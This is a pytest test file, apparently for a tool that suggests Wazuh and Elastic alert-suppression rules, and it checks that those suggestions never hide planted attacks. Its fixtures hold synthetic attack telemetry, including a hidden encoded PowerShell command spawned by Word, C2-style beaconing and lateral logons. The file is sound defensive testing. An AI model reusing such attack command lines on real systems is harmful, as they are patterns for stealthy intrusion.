    """A TP recorded on another field (the image) passes the pass-1 gates but is caught on the hidden events."""
    events = service_automation() + human_background(TASK)
    evil = events[500]
    evil.fields["data.win.eventdata.image"] = "C:\\\\Users\\\\Public\\\\evil.exe"
    disp = Dispositions.from_rows(
        [
            {
                "rule_id": "100200",
                "field": "data.win.eventdata.image",
                "value": "C:\\\\Users\\\\Public\\\\evil.exe",
                "verdict": "tp",
            }
        ]
    )
    result = run(events, dispositions=disp)
    anchored = with_value(result, "svc_backup")
    assert anchored and all(s.verdict == "investigate" for s in anchored)
    assert anchored[0].reasons[0].key == "noise.backtest.tp"  # type: ignore[union-attr]
    finding = finding_for(result, anchored[0])
    assert finding.kind == "noise.investigate" and finding.evidence["backtest"]["tp_hidden"] == 1
    assert tune(result) == []


def test_backtest_catches_a_beacon_hidden_in_a_hostless_scope() -> None:
    """A process-path anchor (no host condition) cannot see beacons in pass 1; the backtest does."""
    image = "C:\\\\Program Files\\\\Agent\\\\agent.exe"
    events = [
        alert(NET_CONN, t, f"srv-{i % 3:02d}.corp.example", win={"image": image, "destinationIp": f"10.0.9.{i % 200}"})
        for i, t in enumerate(every(START, END, timedelta(minutes=10), seed=21))
    ]
    events += [
        alert(NET_CONN, t, "srv-01.corp.example", win={"image": image, "destinationIp": "198.51.100.200"})
        for t in every(START, END, timedelta(minutes=30), seed=22)
    ]
    result = run(events)
    assert tune(result) == [] or all(not any(s.matches(e) for e in events[-100:]) for s in tune(result))
    keys = {r.key for s in result.suggestions for r in s.reasons if isinstance(r, Message)}
    assert keys & {"noise.reason.beacon", "noise.backtest.beacon"}


def test_duplicate_storm_on_a_sensitive_rule_is_aggregated() -> None:
    monitor = [
        alert(SSHD_INVALID, t, "srv-app-01.corp.example", data={"srcip": "10.0.3.3", "srcuser": "nagios"})
        for t in every(START, END, timedelta(seconds=60), seed=23)
    ]
    result = run(monitor)
    render_everything(result)
    verdicts = {s.verdict for s in with_value(result, "10.0.3.3")}
    assert verdicts == {"aggregate"}, [(s.conditions, s.verdict) for s in result.suggestions]
    finding = finding_for(result, with_value(result, "10.0.3.3")[0])
    assert finding.kind == "noise.aggregate"
    assert finding.evidence["rule_id"] == "5710"


def test_rule_level_burst_without_a_heavy_hitter_is_investigated() -> None:
    rng = random.Random(24)
    scattered = [
        alert(
            WEB_400,
            START + timedelta(days=d, hours=rng.uniform(0, 24)),
            "srv-web-01.example",
            data={"srcip": f"192.0.2.{rng.randint(1, 254)}"},
        )
        for d in range(21)
        for _ in range(20)
    ]
    wave = [
        alert(
            WEB_400,
            END - timedelta(days=3, hours=rng.uniform(0, 20)),
            f"srv-web-{rng.randint(10, 99)}.example",
            data={"srcip": f"203.0.113.{rng.randint(1, 254)}"},
        )
        for _ in range(400)
    ]
    result = run(scattered + wave)
    render_everything(result)
    burst = [f for f in result.findings if f.subject == "rule:31101" and f.kind == "noise.investigate"]
    assert len(burst) == 1 and isinstance(burst[0].title, Message) and burst[0].title.key == "noise.title.rule_burst"
    assert next(r for r in result.section["rules"] if r["rule_id"] == "31101")["verdict"] == "investigate"


def test_syslog_devices_behind_agent_000_are_scoped_by_device() -> None:
    events = [
        alert(
            SSHD_INVALID,
            t,
            "wazuh-manager",
            agent_id="000",
            data={"srcip": "10.20.0.15", "srcuser": "backup"},
            extra={"predecoder.hostname": "fw-edge-01", "location": "192.0.2.10"},
        )
        for t in every(START, END, timedelta(minutes=20), seed=25)
    ]
    result = run(events)
    render_everything(result)
    assert result.suggestions
    for suggestion in result.suggestions:
        assert all(c.field != "agent.name" for c in suggestion.conditions)  # never "mute the manager"
    fields = {c.field for s in result.suggestions for c in s.conditions}
    assert fields & {"predecoder.hostname", "location", "data.srcip"}


def test_generic_profile_uses_the_input_mapping() -> None:
    from hushwatch.config import InputConfig

    tenant = TenantConfig(
        trusted_entities={"user": ["svc_backup"]},
        inputs=[InputConfig(path="/dev/null", profile="generic", mapping={"host": "hostname", "user": "account"})],
    )
    events = [
        Event(
            ts=t,
            rule_id="R-1",
            rule_name="custom",
            severity=6,
            fields={"hostname": "srv-01.example", "account": "svc_backup"},
        )
        for t in every(START, END, timedelta(minutes=30), seed=26)
    ]
    result = run(events, tenant=tenant, profile="generic")
    tuned = tune(result)
    assert tuned and {c.field for c in tuned[0].conditions} <= {"hostname", "account"}
    nothing = run(events, tenant=TenantConfig(), profile="generic")  # no mapping: no anchors, nothing to tune
    assert tune(nothing) == []


def test_profile_can_change_mid_stream() -> None:
    events = service_automation()
    collector = NoiseCollector(TENANT, "auto")
    for i, event in enumerate(events):
        if i == len(events) // 2:
            collector.profile = "wazuh4"
        collector.add(event)
    assert collector.effective_profile() == "wazuh4"
    result = apply_backtest(analyze_noise(collector, tenant=TENANT, now=END), events, tenant=TENANT)
    assert tune(result)


def test_naive_now_and_expiry_bounds() -> None:
    events = service_automation()
    collector = NoiseCollector(TENANT, "wazuh4")
    for event in events:
        collector.add(event)
    naive = analyze_noise(collector, tenant=TENANT, now=END.replace(tzinfo=None), expires_days=10**9)
    assert naive.suggestions[0].expires == END.date() + timedelta(days=3650)
    short = analyze_noise(collector, tenant=TENANT, now=END, expires_days=-5)
    assert short.suggestions[0].expires == END.date() + timedelta(days=1)


def test_stable_pair_is_preferred_over_host_wide_scope() -> None:
    rng = random.Random(27)
    monitor = [
        alert(WEB_400, t, "srv-web-01.example", data={"srcip": "10.0.7.7", "url": "/status"})
        for t in every(START, END, timedelta(minutes=30), seed=28)
    ]
    internet = [
        alert(
            WEB_400,
            START + timedelta(days=rng.uniform(0, 21)),
            "srv-web-01.example",
            data={"srcip": f"10.9.{rng.randint(0, 255)}.{rng.randint(1, 254)}"},
        )
        for _ in range(len(monitor) // 2)
    ]
    result = run(monitor + internet)
    scopes = [{c.field: c.value for c in s.conditions} for s in result.suggestions]
    assert {"agent.name": "srv-web-01.example", "data.srcip": "10.0.7.7"} in scopes
    assert {"agent.name": "srv-web-01.example"} not in scopes  # the rest of the host stays visible


def test_new_heavy_actor_inside_a_host_wide_scope_blocks_tuning() -> None:
    routine = [
        alert(TASK, t, "srv-01.corp.example", win={"subjectUserName": f"u{i % 50}"})
        for i, t in enumerate(every(START, END, timedelta(minutes=30), seed=29))
    ]
    quiet = run(routine)
    host_wide = [s for s in quiet.suggestions if [c.field for c in s.conditions] == ["agent.name"]]
    assert host_wide and host_wide[0].verdict == "tune"
    newcomer = [
        alert(TASK, t, "srv-01.corp.example", win={"subjectUserName": "mallory"})
        for t in every(END - timedelta(days=3), END, timedelta(minutes=20), seed=30)
    ]
    noisy = run(routine + newcomer)
    host_wide = [s for s in noisy.suggestions if [c.field for c in s.conditions] == ["agent.name"]]
    assert host_wide and host_wide[0].verdict == "investigate"
    assert host_wide[0].reasons[0].key == "noise.backtest.novel_actor"  # type: ignore[union-attr]
    assert_never_hidden(noisy, newcomer)


def test_ecs_in_band_dispositions() -> None:
    """Elastic alerts carry kibana.alert.workflow_reason: a true_positive there blocks tuning."""

    def ecs_events(reason_for: Callable[[int], str | None]) -> list[Event]:
        out = []
        for i, t in enumerate(every(START, END, timedelta(minutes=20), seed=31)):
            fields: dict[str, Any] = {
                "kibana.alert.rule.uuid": "rule-uuid-1",
                "host.name": "srv-backup-01.corp.example",
                "user.name": "svc_backup",
                "event.dataset": "windows.security",
            }
            reason = reason_for(i)
            if reason is not None:
                fields["kibana.alert.workflow_reason"] = reason
            out.append(Event(ts=t, rule_id="rule-uuid-1", severity=7, fields=fields, event_id=f"ecs-{i}"))
        return out

    clean = run(ecs_events(lambda i: None), profile="ecs")
    assert tune(clean)
    poisoned = ecs_events(lambda i: "true_positive" if i == 700 else ("false_positive" if i % 10 == 0 else None))
    blocked = run(poisoned, profile="ecs")
    assert tune(blocked) == []
    assert all(s.verdict in ("do_not_tune", "investigate") for s in blocked.suggestions)


def test_levels_are_validated() -> None:
    from hushwatch.analysis.noise import _valid_level

    assert _valid_level(7) == 7 and _valid_level(7.0) == 7
    assert _valid_level(7.5) is None and _valid_level(float("nan")) is None and _valid_level(float("inf")) is None
    assert _valid_level(True) is None and _valid_level("12") is None and _valid_level(None) is None


# ---- adversarial II: an attacker who knows the algorithm ----------------------------------------------------------
PROC_CREATE = Rule(
    "92001",
    4,
    ("windows", "sysmon", "sysmon_process_creation"),
    ("Execution",),
    ("T1059.001",),
    "Sysmon - Event 1: Scripting interpreter started (PowerShell or cmd)",
    "windows_eventchannel",
    "EventChannel",
)
NEW_PROCESS = Rule(
    "67027",
    3,
    ("windows", "windows_security"),
    (),
    (),
    "A new process has been created.",
    "windows_eventchannel",
    "EventChannel",
)
FW_DROP = Rule("4101", 5, ("firewall", "firewall_drop"), (), (), "Firewall drop event.", "edgefw", "10.10.0.1")
REMOTE = Rule(
    "100300",
    5,
    ("local", "remote_session"),
    (),
    (),
    "Remote session established",
    "windows_eventchannel",
    "EventChannel",
)
POWERSHELL = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
SVCHOST = "C:\\\\Windows\\\\System32\\\\svchost.exe"
WINWORD = "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE"
SYSMON_1 = {"data.win.system.eventID": "1", "data.win.system.providerName": "Microsoft-Windows-Sysmon"}


def test_13_interpreter_image_never_anchors_a_scope() -> None:
    """PowerShell runs every 20 minutes from scheduled tasks on 3 servers; a Word macro then starts encoded
    PowerShell on a laptop. A scope keyed on the interpreter's image path would hide the macro everywhere."""
    scheduled = [
        alert(
            PROC_CREATE,
            t,
            f"srv-app-{i % 3:02d}.corp.example",
            win={"image": POWERSHELL, "parentImage": SVCHOST, "commandLine": "powershell.exe -File C:\\\\inv.ps1"},
            extra=SYSMON_1,
        )
        for i, t in enumerate(every(START, END, timedelta(minutes=20), jitter=60, seed=40))
    ]
    macro = [
        alert(
            PROC_CREATE,
            END - timedelta(days=1, hours=3),
            "lap-003.corp.example",
            win={"image": POWERSHELL, "parentImage": WINWORD, "commandLine": "powershell.exe -NoP -W Hidden -Enc SQ"},
            extra=SYSMON_1,
        )
    ]
    result = run(scheduled + macro, tenant=TenantConfig())
    render_everything(result)
    assert_never_hidden(result, macro)
    for suggestion in result.suggestions:
        assert all(c.value not in (POWERSHELL, SVCHOST) for c in suggestion.conditions), suggestion.conditions
    # process creation is treated as sensitive: without trusted anchors and FP evidence nothing is tuned
    assert tune(result) == []
    keys = {
        r.params.get("tactics").key
        for s in result.suggestions
        for r in s.reasons  # type: ignore[union-attr]
        if isinstance(r, Message)
        and r.key.startswith("noise.reason.sensitive")
        and isinstance(r.params.get("tactics"), Message)
    }
    assert "noise.label.tactics_and_process" in keys or "noise.label.process_creation" in keys


def test_14_generic_parent_never_anchors_a_scope() -> None:
    """svchost.exe is the parent of services and scheduled tasks: a scope on it hides a malicious scheduled task."""
    children = [
        "C:\\\\Windows\\\\System32\\\\taskhostw.exe",
        "C:\\\\Program Files\\\\Backup\\\\agent.exe",
        "C:\\\\Windows\\\\System32\\\\sppsvc.exe",
    ]
    routine = [
        alert(
            NEW_PROCESS,
            t,
            f"srv-{i % 2:02d}.corp.example",
            win={"newProcessName": children[i % 3], "parentProcessName": SVCHOST},
        )
        for i, t in enumerate(every(START, END, timedelta(minutes=10), seed=41))
    ]
    evil = [
        alert(
            NEW_PROCESS,
            END - timedelta(hours=5),
            "srv-01.corp.example",
            win={"newProcessName": "C:\\\\Users\\\\Public\\\\evil.exe", "parentProcessName": SVCHOST},
        )
    ]
    result = run(routine + evil, tenant=TenantConfig())
    render_everything(result)
    assert_never_hidden(result, evil)
    assert not any(c.value == SVCHOST for s in result.suggestions for c in s.conditions)


def test_15_syslog_sender_scope_gets_host_safeguards() -> None:
    """Firewall drops relayed to the manager (agent 000) without a syslog hostname: the sender address in
    ``location`` is the whole device. Traffic from the Internet means "restrict exposure", never "mute"."""
    rng = random.Random(3)
    drops = [
        alert(
            FW_DROP,
            t,
            "wazuh-manager",
            agent_id="000",
            data={"srcip": f"203.0.113.{rng.randint(1, 254)}", "dstip": "10.10.1.5", "action": "deny"},
        )
        for t in every(START, END, timedelta(minutes=5), seed=42)
    ]
    result = run(drops, tenant=TenantConfig())
    render_everything(result)
    assert tune(result) == []
    device = [s for s in result.suggestions if any(c.field == "location" for c in s.conditions)]
    assert device and all(s.verdict == "fix_at_source" for s in device)
    finding = finding_for(result, device[0])
    assert isinstance(finding.title, Message) and finding.title.key == "noise.title.fix_at_source.exposure"
    # the manager's own name is never a scope: it would mute every device that sends it syslog
    assert not any(c.field == "agent.name" for s in result.suggestions for c in s.conditions)


def test_15b_manager_name_is_never_a_scope_even_for_internal_senders() -> None:
    events = [
        alert(
            FW_DROP,
            t,
            "wazuh-manager",
            agent_id="000",
            data={"srcip": f"10.0.{i % 3}.9", "action": "deny"},
            extra={"location": f"10.10.0.{i % 2 + 1}"},
        )
        for i, t in enumerate(every(START, END, timedelta(minutes=10), seed=43))
    ]
    result = run(events, tenant=TenantConfig())
    render_everything(result)
    assert result.suggestions
    assert not any(c.field == "agent.name" for s in result.suggestions for c in s.conditions)


def test_16_machine_accounts_never_anchor_and_are_never_trusted_by_pattern() -> None:
    """``*$`` is in the default service-account patterns, but a machine account (creatable by any domain user) is
    neither trusted nor a scope of its own: on a logon rule the subject ``SRV-BACKUP-01$`` is the whole server."""
    logons = [
        alert(
            WIN_LOGON,
            t,
            "srv-backup-01.corp.example",
            win={"subjectUserName": "SRV-BACKUP-01$", "targetUserName": "svc_backup", "logonType": "4"},
        )
        for t in every(START, END, timedelta(minutes=15), seed=43)
    ]
    admins = [
        alert(
            WIN_LOGON,
            START + timedelta(days=d, hours=10),
            "srv-backup-01.corp.example",
            win={"subjectUserName": "SRV-BACKUP-01$", "targetUserName": "admin_bob", "logonType": "10"},
        )
        for d in range(21)
    ]
    background = [
        alert(
            WIN_LOGON,
            START + timedelta(days=d, hours=h, minutes=5 * k),
            f"ws-{h:02d}.corp.example",
            win={
                "subjectUserName": f"WS-{h:02d}$",
                "targetUserName": ["alice", "bob", "carol"][h % 3],
                "logonType": "2",
            },
        )
        for d in range(21)
        for h in range(9, 17)
        for k in range(12)
    ]
    rdp = [
        alert(
            WIN_LOGON,
            END - timedelta(hours=10),
            "srv-backup-01.corp.example",
            win={
                "subjectUserName": "SRV-BACKUP-01$",
                "targetUserName": "mallory",
                "logonType": "10",
                "ipAddress": "10.40.1.99",
            },
        )
    ]
    disp = Dispositions.from_rows([{"alert_id": e.event_id, "verdict": "btp"} for e in logons[:40] if e.event_id])
    tenant = TenantConfig(trusted_entities={"user": ["svc_backup"]})
    # machine accounts must never be trusted, even if an operator adds "*$" to the patterns
    tenant.noise.service_account_patterns = (*tenant.noise.service_account_patterns, "*$")
    result = run(logons + admins + background + rdp, tenant=tenant, dispositions=disp)
    render_everything(result)
    assert_never_hidden(result, rdp + admins)
    for suggestion in result.suggestions:
        fields = [c.field for c in suggestion.conditions]
        assert fields not in (["data.win.eventdata.subjectUserName"], ["data.win.eventdata.targetUserName"]), fields
    tuned = tune(result)
    assert len(tuned) == 1
    assert {(c.field, c.value) for c in tuned[0].conditions} == {
        ("agent.name", "srv-backup-01.corp.example"),
        ("data.win.eventdata.targetUserName", "svc_backup"),
        ("data.win.eventdata.logonType", "4"),  # the batch logons only: an RDP with the same account stays visible
    }


def test_17_account_scopes_are_bound_to_hosts() -> None:
    """A service account used on three servers for weeks; its (stolen) credentials then reach a domain controller.
    A scope on the account alone would follow the credentials to the new host."""
    usage = [
        alert(REMOTE, t, f"srv-{i % 3:02d}.corp.example", win={"targetUserName": "svc_monitor"})
        for i, t in enumerate(every(START, END, timedelta(minutes=30), seed=44))
    ]
    lateral = [
        alert(REMOTE, END - timedelta(hours=3, minutes=m), "dc01.corp.example", win={"targetUserName": "svc_monitor"})
        for m in range(3)
    ]
    # an account that merely looks like a service account is not vouched for: triage evidence is needed
    unvouched = run(usage + lateral, tenant=TenantConfig())
    render_everything(unvouched)
    assert tune(unvouched) == []
    keys = {r.key for s in unvouched.suggestions for r in s.reasons if isinstance(r, Message)}
    assert "noise.reason.attacker_field" in keys
    # once the tenant vouches for it, the per-host automation is tunable, host by host
    result = run(usage + lateral, tenant=TenantConfig(trusted_entities={"user": ["svc_monitor"]}))
    render_everything(result)
    assert_never_hidden(result, lateral)
    assert tune(result), "the per-host automation is still a tuning candidate"
    for suggestion in tune(result):
        assert any(c.field == "agent.name" for c in suggestion.conditions)


def test_18_a_few_alerts_from_a_new_actor_block_a_host_scope() -> None:
    """Blending in: 8 alerts from a new source address inside a host scope of 1,500 alerts (0.5%)."""
    routine = [
        alert(TASK, t, "srv-01.corp.example", data={"srcip": f"10.0.0.{i % 40 + 1}"})
        for i, t in enumerate(every(START, END, timedelta(minutes=20), seed=47))
    ]
    intruder = [
        alert(TASK, END - timedelta(hours=h), "srv-01.corp.example", data={"srcip": "10.66.6.6"}) for h in range(8)
    ]
    result = run(routine + intruder, tenant=TenantConfig())
    render_everything(result)
    assert_never_hidden(result, intruder)
    host_wide = [s for s in result.suggestions if [c.field for c in s.conditions] == ["agent.name"]]
    assert host_wide and host_wide[0].verdict == "investigate"
    assert host_wide[0].reasons[0].key == "noise.backtest.novel_actor"  # type: ignore[union-attr]


def test_19_duty_cycled_beacon_is_investigated() -> None:
    """A beacon every 5 minutes, but only 08:00-18:00: sparse over the day, perfectly regular while active."""
    rng = random.Random(1)
    beacon = []
    t = START
    while t < END:
        if 8 <= t.hour < 18:
            beacon.append(
                alert(
                    NET_CONN,
                    t + timedelta(seconds=rng.randint(0, 10)),
                    "srv-app-01.corp.example",
                    win={"image": "C:\\\\ProgramData\\\\svc\\\\upd.exe", "destinationIp": "198.51.100.77"},
                )
            )
        t += timedelta(minutes=5)
    monitor = [
        alert(
            NET_CONN,
            t,
            "srv-app-01.corp.example",
            win={"image": "C:\\\\Program Files\\\\Mon\\\\mon.exe", "destinationIp": f"10.0.3.{i % 5 + 1}"},
        )
        for i, t in enumerate(every(START, END, timedelta(minutes=7), seed=3))
    ]
    result = run(beacon + monitor, tenant=TenantConfig())
    render_everything(result)
    assert_never_hidden(result, beacon)
    keys = {r.key for s in result.suggestions for r in s.reasons if isinstance(r, Message)}
    assert keys & {"noise.reason.beacon", "noise.backtest.beacon"}


def test_20_internal_source_reaching_a_new_host_is_investigated() -> None:
    """The trusted scanner scans the same four servers for weeks, then hits a domain controller (it was
    compromised). A scope on the scanner's address must not follow it to a host it never touched."""
    events = _scanner_noise()
    events += [
        alert(
            SSHD_INVALID,
            END - timedelta(hours=2, minutes=m),
            "dc01.corp.example",
            data={"srcip": "10.20.0.15", "srcuser": "administrator"},
        )
        for m in range(4)
    ]
    ids = [e.event_id for e in events[:40]]
    disp = Dispositions.from_rows([{"alert_id": i, "verdict": "btp"} for i in ids if i])
    result = run(events, dispositions=disp)
    render_everything(result)
    scanner = with_value(result, "10.20.0.15", rule="5710")
    assert scanner and all(s.verdict == "investigate" for s in scanner)
    keys = {r.key for s in scanner for r in s.reasons if isinstance(r, Message)}
    assert "noise.backtest.novel_host" in keys
    assert tune(result) == []


def test_21_internet_facing_noise_is_fixed_at_source_even_when_narrowed() -> None:
    """Bots hammering /wp-login.php from ever-changing public addresses: the host scope is narrowed by the URL,
    so pass 1 cannot see where the traffic comes from; the backtest measures it exactly."""
    rng = random.Random(45)
    wp = [
        alert(
            WEB_400,
            t,
            "srv-web-01.example",
            data={"srcip": f"198.51.100.{rng.randint(1, 254)}", "url": "/wp-login.php"},
        )
        for t in every(START, END, timedelta(minutes=10), seed=45)
    ]
    internal = [
        alert(WEB_400, t, "srv-web-01.example", data={"srcip": "10.1.1.9", "url": f"/app/{i % 3}"})
        for i, t in enumerate(every(START, END, timedelta(minutes=10), seed=46))
    ]
    result = run(wp + internal, tenant=TenantConfig())
    render_everything(result)
    assert all(not s.matches(e) for s in tune(result) for e in wp)
    login = [s for s in result.suggestions if any(c.value == "/wp-login.php" for c in s.conditions)]
    assert login and all(s.verdict == "fix_at_source" for s in login)
    finding = finding_for(result, login[0])
    assert isinstance(finding.title, Message) and finding.title.key == "noise.title.fix_at_source.exposure"


def test_22_true_positive_rows_match_tolerantly() -> None:
    """Analysts write ``srcip`` or change case: a TP veto that over-matches is safe, one that misses is not."""
    events = service_automation() + human_background(TASK)
    target = events[500]
    target.fields["data.srcip"] = "10.9.9.9"
    disp = Dispositions.from_rows([{"rule_id": "100200", "field": "srcip", "value": " 10.9.9.9 ", "verdict": "TP"}])
    result = run(events, dispositions=disp)
    anchored = with_value(result, "svc_backup")
    assert anchored and all(s.verdict == "investigate" for s in anchored)
    assert tune(result) == []


def test_23_hidden_alerts_of_unknown_level_block_tuning() -> None:
    events = service_automation() + human_background(TASK)
    events[700].severity = None
    events[700].fields["rule.level"] = None
    result = run(events)
    anchored = with_value(result, "svc_backup")
    assert anchored and all(s.verdict == "investigate" for s in anchored)
    assert any(r.key == "noise.backtest.unknown_level" for s in anchored for r in s.reasons if isinstance(r, Message))


def test_24_review_wording_never_claims_correlation_keeps_working() -> None:
    events = service_automation() + human_background(TASK)
    result = run(events, dependents=lambda rule_id: ("100201",) if rule_id == "100200" else ())
    tuned = tune(result)
    assert tuned and all(s.review_required for s in tuned)
    finding = finding_for(result, tuned[0])
    english = i18n.render(finding.recommendation, "en")
    spanish = i18n.render(finding.recommendation, "es")
    assert "may make those rules stop counting" in english and "100201" in english and "wazuh-logtest" in english
    assert "dejen de contar" in spanish and "100201" in spanish


def test_25_tp_lookback_is_anchored_to_the_data_not_the_wallclock() -> None:
    """Analyzing an old export months later must not age its true positives out of the 90-day veto."""
    events = service_automation() + human_background(TASK)
    one = next(e for e in events if e.fields["agent.name"] == "srv-backup-01.corp.example")
    disp = Dispositions.from_rows([{"alert_id": one.event_id, "verdict": "tp", "closed_at": "2026-09-10"}])
    later = run(events, dispositions=disp, now=END + timedelta(days=200))
    blocked = with_value(later, "svc_backup")
    assert blocked and all(s.verdict == "do_not_tune" for s in blocked)


@pytest.mark.e2e
def test_demo_dataset_no_tune_hides_a_planted_attack(tmp_path: Any) -> None:
    """The whole demo (~110k alerts): no ``tune`` suggestion matches any ``must_not_hide`` event."""
    from hushwatch.analysis.dispositions import Dispositions as Disp
    from hushwatch.config import load_config
    from hushwatch.demo import generate
    from hushwatch.ingest import open_files
    from hushwatch.models import get_path
    from hushwatch.wazuh.ruleset import load_ruleset

    manifest = generate(tmp_path)
    tenant = load_config(manifest.config_path).tenant()
    source = open_files([str(manifest.alerts_path)], profile="wazuh4", tenant=tenant)
    collector = NoiseCollector(tenant, "wazuh4", Disp.load(manifest.dispositions_path, tenant=tenant.name))
    for event in source:
        collector.add(event)
    ruleset = load_ruleset([str(manifest.rules_dir)])
    result = analyze_noise(collector, tenant=tenant, now=manifest.now, dependents=ruleset.dependents)
    result = apply_backtest(result, source, tenant=tenant)
    tuned = tune(result)
    assert tuned
    planted = [sc for sc in manifest.ground_truth if sc.must_not_hide]
    checked = 0
    for event in source:
        for sc in planted:
            if sc.rule_ids and event.rule_id not in sc.rule_ids:
                continue
            if (sc.start and event.ts < sc.start) or (sc.end and event.ts > sc.end):
                continue
            if any(str(get_path(event.fields, f)) != v for f, v in sc.conditions):
                continue
            checked += 1
            for suggestion in tuned:
                assert not suggestion.matches(event), (sc.id, suggestion.rule_id, suggestion.conditions)
    assert checked > 1000


def test_26_syslog_sender_is_combined_with_a_stable_second_anchor() -> None:
    """Without a syslog hostname, the sender address is the device: the tunable scope is sender + trusted monitor,
    and the rest of the device (random internal sources) stays visible."""
    rng = random.Random(3)
    monitor = [
        alert(
            FW_DROP, t, "wazuh-manager", agent_id="000", data={"srcip": "10.20.0.15", "dstip": f"10.10.1.{i % 9 + 1}"}
        )
        for i, t in enumerate(every(START, END, timedelta(minutes=10), seed=42))
    ]
    others = [
        alert(
            FW_DROP,
            t,
            "wazuh-manager",
            agent_id="000",
            data={"srcip": f"10.3.{rng.randint(0, 200)}.{rng.randint(1, 254)}", "dstip": "10.10.1.5"},
        )
        for t in every(START, END, timedelta(minutes=10), seed=43)
    ]
    result = run(monitor + others, tenant=TenantConfig(trusted_entities={"data.srcip": ["10.20.0.15"]}))
    render_everything(result)
    tuned = tune(result)
    assert [{(c.field, c.value) for c in s.conditions} for s in tuned] == [
        {("location", "10.10.0.1"), ("data.srcip", "10.20.0.15")}
    ]
    assert_never_hidden(result, others)
